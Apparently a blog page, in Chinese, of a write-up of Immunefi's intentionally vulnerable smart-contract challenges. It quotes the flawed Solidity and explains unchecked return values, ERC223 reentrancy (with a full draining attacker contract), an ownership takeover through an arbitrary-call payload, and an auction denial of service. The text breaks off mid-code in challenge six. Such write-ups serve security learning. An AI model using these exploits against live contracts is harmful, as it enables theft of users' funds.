@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="持续更新中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Immunefi-community-challenges">
+<meta property="og:url" content="https://zpano.cn/2022/03/29/38/index.html">
+<meta property="og:site_name" content="Zpano&#39;s Blog">
+<meta property="og:description" content="持续更新中">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-29T14:32:31.000Z">
+<meta property="article:modified_time" content="2022-03-29T14:33:56.276Z">
+<meta property="article:author" content="Zpano">
+<meta property="article:tag" content="区块链安全">
+<meta property="article:tag" content="智能合约安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://zpano.cn/2022/03/29/38/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Immunefi-community-challenges | Zpano's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Zpano's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Immunefi-community-challenges"><span class="nav-number">1.</span> <span class="nav-text">Immunefi-community-challenges</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%80"><span class="nav-number">2.</span> <span class="nav-text">挑战一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E4%BA%8C"><span class="nav-number">3.</span> <span class="nav-text">挑战二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%89"><span class="nav-number">4.</span> <span class="nav-text">挑战三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E5%9B%9B"><span class="nav-number">5.</span> <span class="nav-text">挑战四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E4%BA%94"><span class="nav-number">6.</span> <span class="nav-text">挑战五</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E5%85%AD"><span class="nav-number">7.</span> <span class="nav-text">挑战六</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8C%91%E6%88%98%E4%B8%83"><span class="nav-number">8.</span> <span class="nav-text">挑战七</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zpano"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Zpano</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2022/03/29/38/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Zpano">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zpano's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Immunefi-community-challenges
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-29 22:32:31 / 修改时间：22:33:56" itemprop="dateCreated datePublished" datetime="2022-03-29T22:32:31+08:00">2022-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">持续更新中</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Immunefi-community-challenges"><a href="#Immunefi-community-challenges" class="headerlink" title="Immunefi-community-challenges"></a>Immunefi-community-challenges</h1><p>​    <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges">immunefi</a>写的一个挑战，持续更新中，就来写写WP</p>
+<h1 id="挑战一"><a href="#挑战一" class="headerlink" title="挑战一"></a>挑战一</h1><p>这个挑战涉及两个合约   <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/vulnerable/Exchange.sol">主合约</a>    <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/tokens/StokenERC20.sol">StokenERC20合约</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function enter(uint256 amount) public &#123;</span><br><span class="line">    require(amount &gt;&#x3D; 10, &quot;minimum is 10&quot;);</span><br><span class="line">    token.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    balances[msg.sender] +&#x3D; amount;</span><br><span class="line">    emit Transfer(msg.sender, address(this), amount);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function exit(uint256 amount) public &#123;</span><br><span class="line">    uint256 getAmount &#x3D; balances[msg.sender];</span><br><span class="line">    require(getAmount &gt;&#x3D; amount, &quot;user doesn&#39;t have enough funds deposited&quot;);</span><br><span class="line">    balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    payable(msg.sender).transfer(amount);</span><br><span class="line">    emit NativeTransfer(msg.sender, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public override returns (bool) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            if (balanceOf[msg.sender] &gt;&#x3D; _value &amp;&amp; balanceOf[_to] + _value &gt;&#x3D; balanceOf[_to]) &#123;</span><br><span class="line">                balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">                balanceOf[_to] +&#x3D; _value;</span><br><span class="line">                emit Transfer(msg.sender, _to, _value);</span><br><span class="line">                return true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address _from,</span><br><span class="line">        address _to,</span><br><span class="line">        uint256 _value</span><br><span class="line">    ) public override returns (bool) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            if (</span><br><span class="line">                balanceOf[_from] &gt;&#x3D; _value &amp;&amp;</span><br><span class="line">                allowance[_from][msg.sender] &gt;&#x3D; _value &amp;&amp;</span><br><span class="line">                balanceOf[_to] + _value &gt;&#x3D; balanceOf[_to]</span><br><span class="line">            ) &#123;</span><br><span class="line">                balanceOf[_to] +&#x3D; _value;</span><br><span class="line">                balanceOf[_from] -&#x3D; _value;</span><br><span class="line">                emit Transfer(_from, _to, _value);</span><br><span class="line">                allowance[_from][msg.sender] -&#x3D; _value;</span><br><span class="line">                emit Approval(_from, msg.sender, allowance[_from][msg.sender]);</span><br><span class="line">                return true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p> 对token的方法进行调用，但是对于返回值的处理不正确，即便返回false，enter和exit函数也会继续执行，这就可以实现任意token铸造，或者提取合约的全部ETH</p>
+<h1 id="挑战二"><a href="#挑战二" class="headerlink" title="挑战二"></a>挑战二</h1><p><a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/vulnerable/Staking.sol">主合约</a> <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/tokens/MockERC223.sol">ERC233合约</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function unstake(uint256 amount) public &#123;</span><br><span class="line">        uint256 userBal &#x3D; balances[msg.sender];</span><br><span class="line">        require(userBal &gt;&#x3D; amount, &quot;Staking: not enough deposited funds&quot;);</span><br><span class="line">        uint256 stakedDiff &#x3D; block.timestamp - stakeDuration[msg.sender];</span><br><span class="line">        require(stakedDiff &gt;&#x3D; 604800, &quot;Staking: wait till 7 days elapsed&quot;);</span><br><span class="line">        if (!rewardClaimed[msg.sender]) &#123;</span><br><span class="line">            payable(msg.sender).transfer(reward);</span><br><span class="line">            rewardClaimed[msg.sender] &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        token.transfer(msg.sender, amount);</span><br><span class="line">        balances[msg.sender] &#x3D; userBal - amount;</span><br><span class="line">        emit Unstaked(msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public override returns (bool success) &#123;</span><br><span class="line">        &#x2F;&#x2F; Standard function transfer similar to ERC20 transfer with no _data .</span><br><span class="line">        &#x2F;&#x2F; Added due to backwards compatibility reasons .</span><br><span class="line">        bytes memory _empty &#x3D; hex&quot;00000000&quot;;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">        balanceOf[_to] +&#x3D; _value;</span><br><span class="line">        if (Address.isContract(_to)) &#123;</span><br><span class="line">            IERC223Recipient(_to).tokenReceived(msg.sender, _value, _empty);</span><br><span class="line">        &#125;</span><br><span class="line">        emit Transfer(msg.sender, _to, _value);</span><br><span class="line">        emit TransferData(_empty);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">IERC223Recipient(<span class="params">_to</span>)</span>.token<span class="constructor">Received(<span class="params">msg</span>.<span class="params">sender</span>, <span class="params">_value</span>, <span class="params">_empty</span>)</span>;</span><br></pre></td></tr></table></figure>
+<p>通过unstake调用token得transfer，这里的to就是unstake中的msg.sender，如果通过了Address.isContract(_to) 判断，就可以调用我们自己定义的tokenReceived方法，实现重复提取staking合约在Token 合约上的token，直至耗尽</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract ERC223Reentrant is IERC223Recipient &#123;</span><br><span class="line">    IERC223 public token;</span><br><span class="line">    IStaking public vulnContract;</span><br><span class="line">    uint256 public depositedFunds;</span><br><span class="line"></span><br><span class="line">    constructor(address _token, address _vulnContract) &#123;</span><br><span class="line">        token &#x3D; IERC223(_token);</span><br><span class="line">        vulnContract &#x3D; IStaking(_vulnContract);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function enter(uint256 _amount) public &#123;</span><br><span class="line">        depositedFunds &#x3D; vulnContract.balanceOf(address(this)) + _amount;</span><br><span class="line">        token.transfer(address(vulnContract), _amount);</span><br><span class="line">        require(</span><br><span class="line">            vulnContract.balanceOf(address(this)) &#x3D;&#x3D; depositedFunds,</span><br><span class="line">            &quot;ERC223Reentrant: Something wrong with deposits&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exit() public &#123;</span><br><span class="line">        uint256 balBefore &#x3D; vulnContract.balanceOf(address(this));</span><br><span class="line">        vulnContract.unstake(balBefore);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenReceived(</span><br><span class="line">        address _from,</span><br><span class="line">        uint256 _value,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) public override &#123;</span><br><span class="line">        uint256 balance &#x3D; token.balanceOf(address(vulnContract));</span><br><span class="line">        if (balance &gt; 0) &#123;</span><br><span class="line">            vulnContract.unstake(depositedFunds);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="挑战三"><a href="#挑战三" class="headerlink" title="挑战三"></a>挑战三</h1><p><a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/vulnerable/Takeover.sol">主合约</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyAuth() &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; owner || msg.sender &#x3D;&#x3D; address(this), &quot;Takeover: not allowed&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line">function changeOwner(address newOwner) external onlyAuth &#123;</span><br><span class="line">    require(newOwner !&#x3D; address(0), &quot;Takeover: no address(0)&quot;);</span><br><span class="line">    require(newOwner !&#x3D; owner, &quot;Takeover: no current owner&quot;);</span><br><span class="line">    emit OwnershipChanged(owner, newOwner);</span><br><span class="line">    owner &#x3D; newOwner;</span><br><span class="line">&#125;</span><br><span class="line">function staticall(</span><br><span class="line">    address target,</span><br><span class="line">    bytes memory payload,</span><br><span class="line">    string memory errorMessage</span><br><span class="line">) external returns (bytes memory) &#123;</span><br><span class="line">    require(isContract(target), &quot;Takeover: call to non-contract&quot;);</span><br><span class="line">    (bool success, bytes memory returnData) &#x3D; address(target).call(payload);</span><br><span class="line">    return verifyCallResult(success, returnData, errorMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">(bool success, bytes memory returnData)</span> = address<span class="comment">(target)</span>.<span class="keyword">call</span><span class="comment">(payload)</span>;</span><br></pre></td></tr></table></figure>
+<p>当合约执行到这一行的时候，此时的msg.sender会变成address(this)，我们就可以通过onlyAuth的判断，达到调用changeOwner函数改变owner的目的。payload为0xa6f9dae1+address就可以，剩下的就是withdrawall函数(0x853828b6)</p>
+<h1 id="挑战四"><a href="#挑战四" class="headerlink" title="挑战四"></a>挑战四</h1><p><a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/vulnerable/Auction.sol">主合约</a>  <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/tokens/MockERC721.sol">MockERC721合约</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (bidInfo[_id].status &#x3D;&#x3D; true) &#123;</span><br><span class="line">           if (bidInfo[_id].bid &lt; msg.value) &#123;</span><br><span class="line">               payable(bidInfo[_id].bidder).transfer(bidInfo[_id].bid);</span><br><span class="line">               bidInfo[_id] &#x3D; Bid(&#123;bidder: msg.sender, bid: msg.value, status: true&#125;);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               revert(&quot;Auction: last bidder amount is greater&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           bidInfo[_id] &#x3D; Bid(&#123;bidder: msg.sender, bid: msg.value, status: true&#125;);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>当有人出价高于当前拍卖价格的时候，将退还当前拍卖者的资金，transfer函数在返回false的时候会回滚，不再继续向下执行。就可以通过设定恶意的合约，导致transfer失败。例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fallback() external&#123;&#125;  &#x2F;&#x2F;不接收ETH</span><br><span class="line">receive() external payable &#123; </span><br><span class="line">	require(msg.value&gt;100 ether) &#x2F;&#x2F;设定必定revert的条件</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;直接两种函数都不写</span><br></pre></td></tr></table></figure>
+<h1 id="挑战五"><a href="#挑战五" class="headerlink" title="挑战五"></a>挑战五</h1><p><a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/vulnerable/Staking2.sol">主合约</a>    <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/tokens/ExpensiveToken.sol">ExpensiveToken</a>   <a target="_blank" rel="noopener" href="https://github.com/immunefi-team/community-challenges/blob/master/contracts/tokens/MockERC777.sol">MockERC777</a></p>
+<p>暂时没搞懂</p>
+<h1 id="挑战六"><a href="#挑战六" class="headerlink" title="挑战六"></a>挑战六</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">function onboardWithSig(</span><br><span class="line">        address tokenAddr,</span><br><span class="line">        bytes32 msgHash,</span><br><span class="line">        string memory description,</span><br><span class="line">        bytes memory signature</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(!onboardedApps[tokenAddr], &quot;KYC: already onboarded&quot;);</span><br><span class="line">        require(tokenAddr !&#x3D; address(0), &quot;KYC: token address must not be empty&quot;);</span><br><span class="line">        bytes32 payloadHash &#x3D; keccak256(abi.encode(msgHash, description));</span><br><span class="line">        bytes32 messageHash &#x3D; keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, payloadHash));</span><br><span class="line">        _checkWhitelisted(tokenAddr, messageHash, signature);</span><br><span class="line">        onboardedApps[tokenAddr] &#x3D; 